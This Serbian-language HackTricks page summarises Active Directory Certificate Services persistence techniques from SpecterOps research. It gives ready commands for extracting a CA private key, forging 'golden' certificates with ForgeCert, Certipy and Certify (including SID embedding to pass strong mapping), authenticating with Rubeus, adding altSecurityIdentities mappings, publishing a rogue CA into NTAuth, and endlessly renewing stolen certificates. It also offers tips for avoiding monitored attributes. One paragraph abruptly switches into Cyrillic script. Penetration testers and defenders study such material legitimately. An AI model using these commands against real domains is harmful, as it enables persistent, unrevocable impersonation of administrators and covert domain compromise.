# AD CS postojanost domena

{{#include ../../../banners/hacktricks-training.md}}

**Ovo je sažetak tehnika za postizanje postojanosti u domenu iz dokumenta [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Pogledajte dokument za više detalja.<sup>[[5]](#references)</sup>

## Falsifikovanje sertifikata pomoću ukradenih CA sertifikata (Golden Certificate) - DPERSIST1

Kako možete da utvrdite da li je sertifikat CA sertifikat?

Može se utvrditi da je sertifikat CA sertifikat ako je ispunjeno nekoliko uslova:<sup>[[5]](#references)</sup>

- Sertifikat je uskladišten na CA serveru, a njegov privatni ključ je zaštićen pomoću DPAPI-ja mašine ili hardvera kao što je TPM/HSM, ako ga operativni sistem podržava.
- Polja Issuer i Subject u sertifikatu odgovaraju razlikovnom imenu CA-ja.
- Ekstenzija „CA Version“ prisutna je isključivo u CA sertifikatima.
- Sertifikat nema polja Extended Key Usage (EKU).

Podržani način za izdvajanje privatnog ključa ovog sertifikata jeste korišćenje alata `certsrv.msc` na CA serveru preko ugrađenog grafičkog interfejsa. Ipak, ovaj sertifikat se ne razlikuje od drugih sertifikata uskladištenih u sistemu, pa se za njegovo izdvajanje mogu primeniti metode kao što je [tehnika THEFT2](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Sertifikat i privatni ključ mogu se pribaviti i pomoću alata Certipy, sledećom komandom:<sup>[[2]](#references)</sup>

```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```

Nakon pribavljanja CA sertifikata i njegovog privatnog ključa u formatu `.pfx`, alati poput [ForgeCert](https://github.com/GhostPack/ForgeCert) mogu se koristiti za generisanje validnih sertifikata:

```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```

> [!WARNING]
> Korisnik za kog se falsifikuje sertifikat mora biti aktivan i sposoban da se autentifikuje u Active Directory-ju da bi proces uspeo. Falsifikovanje sertifikata za posebne naloge kao što je krbtgt nije efikasno.

Ovaj falsifikovani sertifikat biće **važeći** do navedenog datuma isteka i **sve dok je važeći root CA sertifikat** (obično od 5 do **više od 10 godina**). Važi i za **mašine**, pa napadač, u kombinaciji sa **S4U2Self**, može da **održi postojanost na bilo kojoj mašini u domenu** sve dok je CA sertifikat važeći.\
Štaviše, **sertifikati generisani** ovom metodom **ne mogu da se opozovu**, jer CA ne zna da postoje.

### Rad u uslovima Strong Certificate Mapping Enforcement (2025+)

Od 11. februara 2025. (nakon uvođenja KB5014754), kontroleri domena podrazumevano koriste **Full Enforcement** za mapiranja sertifikata. U praksi to znači da vaši falsifikovani sertifikati moraju ili da:

- Sadrže snažno povezivanje sa ciljanim nalogom (na primer, SID bezbednosno proširenje), ili
- Budu upareni sa snažnim, eksplicitnim mapiranjem na atributu `altSecurityIdentities` ciljnog objekta.<sup>[[1]](#references)</sup>

Pouzdan pristup za održavanje postojanosti jeste da se izda falsifikovani sertifikat povezan sa ukradenim Enterprise CA, a zatim da se doda snažno eksplicitno mapiranje na principal žrtve:

```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

Napomene
- Ako možete da napravite falsifikovane sertifikate koji sadrže SID security extension, oni će se implicitno mapirati čak i uz Full Enforcement. U suprotnom, prednost dajte eksplicitnim jakim mapiranjima. Više o eksplicitnim mapiranjima potražite u odeljku [account-persistence](account-persistence.md).
- Opoziv ne pomaže odbrani u ovom slučaju: falsifikovani sertifikati nisu poznati CA bazi podataka i zato ne mogu biti opozvani.

#### Falsifikovanje kompatibilno sa Full Enforcement (svesno SID-a)

Ažurirani alati omogućavaju da SID ugradite direktno, pa golden certificates ostaju upotrebljivi čak i kada DC-ovi odbacuju slaba mapiranja:<sup>[[3]](#references)</sup>

```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
  --upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  --outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
  -sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```

Ugrađivanjem SID-a izbegavate potrebu da menjate `altSecurityIdentities`, koji se možda nadzire, a pritom i dalje ispunjavate provere jakog mapiranja.

## Trusting Rogue CA Certificates - DPERSIST2

Objekat `NTAuthCertificates` definisan je tako da sadrži jedan ili više **CA sertifikata** u svom atributu `cacertificate`, koje koristi Active Directory (AD). Tokom provere, **domain controller** proverava da li objekat `NTAuthCertificates` sadrži unos koji odgovara **CA-u navedenom** u polju Issuer autentifikacionog **sertifikata**. Autentifikacija se nastavlja ako je takav unos pronađen.<sup>[[5]](#references)</sup>

Napadač može da doda samopotpisani CA sertifikat u objekat `NTAuthCertificates` ako ima kontrolu nad tim AD objektom. Uobičajeno je da dozvolu za izmenu ovog objekta imaju samo članovi grupe **Enterprise Admin**, kao i **Domain Admins** ili **Administrators** u domenu **korenog šuma**. Mogu da izmenе objekat `NTAuthCertificates` pomoću `certutil.exe` i komande `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` ili pomoću alata [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Dodatne korisne komande za ovu tehniku:

```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```

Ova mogućnost je naročito relevantna kada se koristi zajedno sa prethodno opisanom metodom koja uključuje ForgeCert za dinamičko generisanje sertifikata.

> Razmatranja mapiranja nakon 2025: postavljanje lažnog CA-a u NTAuth uspostavlja poverenje samo u CA koji izdaje sertifikate. Da bi se leaf sertifikati koristili za prijavu kada su DC-ovi u režimu **Full Enforcement**, leaf mora da sadrži SID bezbednosno proširenje ili na ciljnom objektu mora postojati snažno eksplicitno mapiranje (na primer, Issuer+Serial u `altSecurityIdentities`). Pogledajte {{#ref}}account-persistence.md{{#endref}}.

## Zlonamerna pogrešna konfiguracija - DPERSIST3

Mogućnosti za **persistence** kroz **izmene bezbednosnih deskriptora** komponenti AD CS-a su brojne. Napadač sa povišenim pristupom može zlonamerno da primeni izmene opisane u odeljku „[Eskalacija domena](domain-escalation.md)“. To obuhvata dodavanje „prava kontrole“ (npr. WriteOwner/WriteDACL/itd.) osetljivim komponentama kao što su:<sup>[[5]](#references)</sup>

- **AD računarski** objekat CA servera
- **RPC/DCOM server** CA servera
- Bilo koji **AD objekat ili kontejner naslednik** u **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (na primer, kontejner Certificate Templates, kontejner Certification Authorities, objekat NTAuthCertificates itd.)
- **AD grupe kojima je organizacija izričito delegirala prava kontrole CA-a ili šablona**. Уграђена група Cert Publishers има право да објављује сертификате у корисничке објекте у AD-у; само чланство не додељује права контроле CA-а или шаблона нити права за упис. Посебно проверите релевантне дозволе за CA и шаблоне. Погледајте [Microsoft-ov opis grupe Cert Publishers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) i [dozvole za šablone sertifikata](https://learn.microsoft.com/en-us/intune/configmgr/protect/plan-design/planning-for-certificate-template-permissions).

Primer zlonamerne primene podrazumevao bi da napadač sa **povišenim dozvolama** u domenu dodeli dozvolu **`WriteOwner`** podrazumevanom šablonu sertifikata **`User`**, pri čemu je napadač principal kojem je pravo dodeljeno. Da bi to iskoristio, napadač bi najpre promenio vlasnika šablona **`User`** i postavio sebe za vlasnika. Zatim bi na šablonu podesio **`mspki-certificate-name-flag`** na **1** da bi omogućio **`ENROLLEE_SUPPLIES_SUBJECT`**, čime bi korisniku bilo omogućeno da u zahtevu navede Subject Alternative Name. Nakon toga, napadač bi mogao da se **enroll**-uje koristeći **šablon**, da kao alternativno ime izabere ime **administratora domena** i da pribavljeni sertifikat koristi za autentifikaciju kao DA.

Praktična podešavanja koja napadači mogu da primene za dugoročnu persistence u domenu (detalje i načine detekcije potražite u {{#ref}}domain-escalation.md{{#endref}}):

- Zastavice CA politike koje dozvoljavaju SAN od podnosilaca zahteva (npr. omogućavanje `EDITF_ATTRIBUTESUBJECTALTNAME2`). Time putevi slični ESC1 ostaju iskoristivi.
- DACL šablona ili podešavanja koja omogućavaju izdavanje sertifikata za autentifikaciju (npr. dodavanje Client Authentication EKU, omogućavanje `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Kontrolisanje objekta `NTAuthCertificates` ili CA kontejnera kako bi se lažni izdavači mogli ponovo ubacivati ako branioci pokušaju da ih uklone.

> [!TIP]
> U ojačanim okruženjima nakon KB5014754, kombinovanjem ovih pogrešnih konfiguracija sa eksplicitnim snažnim mapiranjima (`altSecurityIdentities`) osigurava se da izdati ili falsifikovani sertifikati ostanu upotrebljivi čak i kada DC-ovi sprovode snažno mapiranje.

### Zloupotreba obnove sertifikata (ESC14) za persistence

Ako kompromitujete sertifikat koji podržava autentifikaciju (ili sertifikat Enrollment Agent-a), možete da ga **obnavljate neograničeno** sve dok je šablon koji ga izdaje objavljen, a vaš CA i dalje veruje lancu izdavaoca. Obnova zadržava prvobitne veze sa identitetom, ali produžava važenje sertifikata, pa je njegovo uklanjanje teško osim ako se šablon ne ispravi ili CA ponovo ne objavi.<sup>[[4]](#references)</sup>

```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```

Ako su kontroleri domena u režimu **Full Enforcement**, dodajte `-sid <victim SID>` (ili koristite šablon koji i dalje uključuje SID bezbednosnu ekstenziju) kako bi se obnovljeni leaf sertifikat i dalje snažno mapirao, bez menjanja `altSecurityIdentities`. Napadači sa CA administratorskim pravima mogu takođe da izmene `policy\RenewalValidityPeriodUnits` i produže važenje obnovljenih sertifikata pre nego što izdaju sebi cert.<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Promene u autentifikaciji zasnovanoj na sertifikatima na Windows kontrolerima domena (vremenska linija sprovođenja i snažna mapiranja)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Referenca komandi i upotreba forge/auth](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (integrisani forge sa podrškom za SID)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [Pregled zloupotrebe obnove ESC14](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Zloupotreba Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
{{#include ../../../banners/hacktricks-training.md}}
